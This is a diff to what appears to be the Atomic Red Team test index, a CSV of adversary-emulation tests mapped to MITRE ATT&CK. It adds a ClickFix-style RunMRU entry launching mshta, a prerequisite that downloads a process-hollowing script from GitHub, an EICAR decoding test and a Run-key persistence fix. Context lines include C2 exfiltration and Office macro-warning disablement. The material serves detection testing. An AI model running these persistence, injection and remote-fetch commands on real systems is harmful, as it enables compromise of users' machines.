@@ -1380,6 +1380,11 @@ Requires the 32 bit version of Office to run. [MirrorBlast Campaign Analysis](ht
 ",windows,,,"Cd ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs""
 New-ItemProperty -Path Registry::HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\16.0\Excel\Security -Name ""VBAWarnings"" -Value ""1"" -PropertyType DWORD -Force | Out-Null
 & '.\Excel 2016.lnk' ""PathToAtomicsFolder\T1204.002\bin\mirrorblast_emulation.xlsm""",powershell,,,"reg delete ""HKCU\SOFTWARE\Microsoft\Office\16.0\Excel\Security"" /v ""VBAWarnings"" /f",,,
+T1204.002,User Execution: Malicious File,ClickFix Campaign - Abuse RunMRU to Launch mshta via PowerShell,3f3120f0-7e50-4be2-88ae-54c61230cb9f,"Simulates a ClickFix-style campaign by adding a malicious entry to the RunMRU registry key that launches `mshta.exe` with a remote payload.
+This technique relies on user interaction (Win+R + Enter) to trigger execution.
+Used in social engineering campaigns that aim to bypass traditional startup methods.
+Reference: https://www.netskope.com/blog/lumma-stealer-fake-captchas-new-techniques-to-evade-detection
+",windows,,,"Set-ItemProperty -Path ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"" -Name ""atomictest"" -Value '""C:\Windows\System32\mshta.exe"" http://localhost/hello6.hta'",powershell,,,"Remove-ItemProperty -Path ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"" -Name ""atomictest"" -ErrorAction SilentlyContinue",,,
 T1041,Exfiltration Over C2 Channel,C2 Data Exfiltration,d1253f6e-c29b-49dc-b466-2147a6191932,"Exfiltrates a file present on the victim machine to the C2 server.
 ",windows,,,"if(-not (Test-Path #{filepath})){ 
   1..100 | ForEach-Object { Add-Content -Path #{filepath} -Value ""This is line $_."" }
@@ -15286,11 +15291,34 @@ input_arguments.seconds_to_sleep.default: 5
 "
 T1055.012,Process Injection: Process Hollowing,Process Hollowing using PowerShell,562427b4-39ef-4e8c-af88-463a78e70b9c,"This test uses PowerShell to create a Hollow from a PE on disk with explorer as the parent.
 Credit to FuzzySecurity (https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Start-Hollow.ps1)
-",windows,,,". ""$PathToAtomicsFolder\T1055.012\src\Start-Hollow.ps1""
+",windows,,,". ""#{script_path}""
 $ppid=Get-Process #{parent_process_name} | select -expand id
 Start-Hollow -Sponsor ""#{sponsor_binary_path}"" -Hollow ""#{hollow_binary_path}"" -ParentPID $ppid -Verbose
 ",powershell,,,"Stop-Process -Name ""#{spawnto_process_name}"" -ErrorAction Ignore
-",,,"input_arguments.hollow_binary_path.description: Path of the binary to hollow (executable that will run inside the sponsor)
+",powershell,"dependencies.0.description: Start-Hollow.ps1 must be installed
+
+dependencies.0.prereq_command: if (Test-Path ""#{script_path}"") {exit 0} else {exit 1}
+
+dependencies.0.get_prereq_command: try {
+  iwr ""#{script_download_url}"" -OutFile (New-Item -Path #{script_path} -Force)
+} catch {
+  Write-Error $_
+  Exit 1
+}
+
+","input_arguments.script_download_url.description: Download url for Start-Hollow.ps1
+
+input_arguments.script_download_url.type: string
+
+input_arguments.script_download_url.default: https://raw.githubusercontent.com/FuzzySecurity/PowerShell-Suite/720d8fe82396faf74f2ca19a3fe99a5c262a14b9/Start-Hollow.ps1
+
+input_arguments.script_path.description: Path to Start-Hollow.ps1
+
+input_arguments.script_path.type: path
+
+input_arguments.script_path.default: PathToAtomicsFolder\T1055.012\src\Start-Hollow.ps1
+
+input_arguments.hollow_binary_path.description: Path of the binary to hollow (executable that will run inside the sponsor)
 
 input_arguments.hollow_binary_path.type: string
 
@@ -15361,7 +15389,8 @@ allows for the retrieval of output generated from executed shellcode.
 - PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#createprocesswithpipe)
 ",windows,,,"$PathToAtomicsFolder\T1055.012\bin\x64\CreateProcessWithPipe.exe -program ""#{hollow_binary_path}"" -debug
 ",powershell,False,,"Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
-Stop-Process -Name ""#{hollow_process_name}"" -ErrorAction SilentlyContinue",,,"input_arguments.hollow_binary_path.description: Path of the binary to hollow
+Stop-Process -Name ""#{hollow_process_name}"" -ErrorAction SilentlyContinue
+",,,"input_arguments.hollow_binary_path.description: Path of the binary to hollow
 
 input_arguments.hollow_binary_path.type: string
 
@@ -17732,6 +17761,12 @@ input_arguments.local_file.type: string
 input_arguments.local_file.default: Easter_egg.password
 
 "
+T1027.013,Obfuscated Files or Information: Encrypted/Encoded File,T1027.013 Encrypted/Encoded File,7693ccaa-8d64-4043-92a5-a2eb70359535,"Decode the eicar value, and write it to file, for AV/EDR to try to catch.",windows,macos,linux,"$encodedString = ""WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo=""
+$bytes = [System.Convert]::FromBase64String($encodedString)
+$decodedString = [System.Text.Encoding]::UTF8.GetString($bytes)
+
+#write the decoded eicar string to file
+$decodedString | Out-File T1027.013_decodedEicar.txt",powershell,False,,Just delete the resulting T1027.013_decodedEicar.txt file.,,,
 T1090.003,Proxy: Multi-hop Proxy,Psiphon,14d55ca0-920e-4b44-8425-37eedd72b173,"Psiphon 3 is a circumvention tool from Psiphon Inc. that utilizes VPN, SSH and HTTP Proxy technology to provide you
 with uncensored access to Internet.
 This process will launch Psiphon 3 and establish a connection. Shortly after it will be shut down via process kill commands.
@@ -24825,7 +24860,10 @@ input_arguments.payload.default: C:\Windows\System32\calc.exe
 "
 T1547.001,Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder,HKCU - Policy Settings Explorer Run Key,a70faea1-e206-4f6f-8d9a-67379be8f6f1,"This test will create a new value under HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run to launch calc.exe on boot. 
 *Requires reboot
-",windows,,,"if (!(Test-Path -Path ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"")){
+",windows,,,"if (!(Test-Path -Path ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"")){
+  New-Item -ItemType Key -Path  ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer""
+}
+if (!(Test-Path -Path ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"")){
   New-Item -ItemType Key -Path  ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run""
 }
 Set-ItemProperty -Path  ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"" -Name ""#{target_key_value_name}"" -Value ""#{payload}""
